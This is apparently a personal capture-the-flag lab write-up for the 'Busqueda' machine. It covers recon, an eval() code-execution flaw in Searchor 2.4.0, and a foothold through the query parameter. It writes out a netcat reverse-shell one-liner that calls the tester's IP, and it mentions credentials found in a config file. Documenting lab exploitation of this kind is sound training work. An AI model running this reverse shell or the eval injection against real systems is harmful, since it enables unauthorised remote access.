202305182100
Status: #rce #cve #evalexploit
Tags: [[Labs]]

# Busqueda
IP: 10.10.11.208

## Recon

Ports open:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Port 80:

- Nmap shows redirect attempt to `searcher.htb`
- Web app utilizes `flask v2.1.2` framework
- Python library `Searchor v2.4.0` is used
- Research shows that any Searchor version before 2.4.2 is vulnerable to arbitrary code execution via the `eval()` function

![[busqueda_exploit.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/busqueda_exploit.png">

- We analyzed the source code before and after the patch

![[busqueda_source.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/busqueda_source.png">

- This will allow us to think of a specific payload to send via input on the webpage

## Establishing Foothold

- For our input, we only have two parameters that can be modified `engine` and `query`
- Messing with the engine parameter will throw an error, therefore the engine parameter is not the approach
- The query parameter can be whatever we want it to be, therefore, we can manipulate the python code to execute system commands
- The payload idea we used can be found in the resource link (Exploiting Eval) below and was slightly modified to fit our Searchor source code

Proof-of-Concept:

![[busqueda_poc.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/busqueda_poc.png">

- We can see that we were able to execute system commands
- We can try to get a reverse shell with RCE

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 9001 >/tmp/f
```

- We can either put it directly into the webpage input field, or edit the parameter on burp (make sure to URL encode in burp)
- This successfully returned a reverse shell for us

## Escalate Privileges

- After some manual enumeration, we discover a config file that reveals credentials and a new subdomain

![[busqueda_leak.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/busqueda_leak.png">

- This is running `gitea v1.18.0`

**PRIVESC WILL NOT BE POSTED SORRY**





---
# References
- Exploiting Eval - https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-eval-code-execution/
- Searchor Code Execution - https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303
- Searchor Vuln Patch - https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b?diff=unified